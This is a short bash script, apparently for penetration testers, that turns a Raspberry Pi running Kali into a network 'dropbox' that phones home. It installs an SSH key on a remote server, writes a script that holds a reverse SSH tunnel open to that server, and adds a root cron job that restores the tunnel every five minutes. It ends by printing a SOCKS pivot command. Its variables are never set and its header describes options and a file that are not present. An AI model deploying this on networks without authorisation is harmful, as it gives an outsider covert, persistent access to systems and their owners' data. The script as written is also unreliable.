#!/bin/bash
#-Metadata----------------------------------------------------#
#  Filename: raspi-autossh.sh            (Update: 2015-10-26) #
#-Info--------------------------------------------------------#
#  Raspberry Pi Kali dropbox automated ssh phone home script  #
#-Author(s)---------------------------------------------------#
#  jbarcia                                                    #
#-Operating System--------------------------------------------#
#  Designed for: Raspberry Pi 2 - Kali Linux 2 [ARM]          #
#     Tested on: Raspberry Pi 2 - Kali Linux 2 [ARM]          #
#-Licence-----------------------------------------------------#
#  MIT License ~ http://opensource.org/licenses/MIT           #
#-Notes-------------------------------------------------------#
#  Run as root, just after a fresh/clean install of Kali 2.0. #
#                             ---                             #
#  Command line arguments:                                    #
#    --tft     = Installs and configures TFT patched kernel   #
#    --expand  = Expands Image size to fill SD card           #
#    e.g. # bash raspi-config.sh --tft                        #
#-------------------------------------------------------------#

$SERVER
$SERVUSR
$PIVPORT

##### Generate SSH Keys and add to authorized keys on main server
ssh-keygen -t rsa
cat ~/.ssh/id_rsa.pub | ssh $SERVUSR@$SERVER "cat - >> ~/.ssh/authorized_keys"


##### Create autossh script
cat <<EOF > "/root/autossh.sh"
#!/bin/sh
# Based on http://www.brandonhutchinson.com/ssh_tunnelling.html
# $REMOTE_HOST is the name of the remote system
REMOTE_HOST=$SERVER
 
# Setting my username for home box, you will most likely want to change this
USER_NAME=$SERVUSR
 
# $REMOTE_PORT is the remote port number that will be used to tunnel
# back to this system
REMOTE_PORT=$PIVPORT
 
EOF
cat <<\EOF >> "/root/autossh.sh"
# $COMMAND is the command used to create the reverse ssh tunnel
COMMAND="ssh -q -N -R $REMOTE_PORT:localhost:22 $USER_NAME@$REMOTE_HOST"
 
# Is the tunnel up? Perform two tests:
 
# 1. Check for relevant process ($COMMAND)
pgrep -f -x "$COMMAND" > /dev/null 2>&1 || $COMMAND
 
# 2. Test tunnel by looking at "netstat" output on $REMOTE_HOST
ssh $REMOTE_HOST netstat -an | egrep "tcp.*:$REMOTE_PORT.*LISTEN" \
   > /dev/null 2>&1
if [ $? -ne 0 ] ; then
   pkill -f -x "$COMMAND"
   $COMMAND
fi
EOF


##### Make Executable
chmod 755 /root/autossh.sh


##### Configure cron job to call home every 5 min
cat <<EOF > "/etc/cron.d/autossh"
*/5 * * * * root bash /root/autossh.sh
EOF


##### DONE
echo "From The Main Server:   ssh –D 1080 -p $PIVPORT root@localhost"
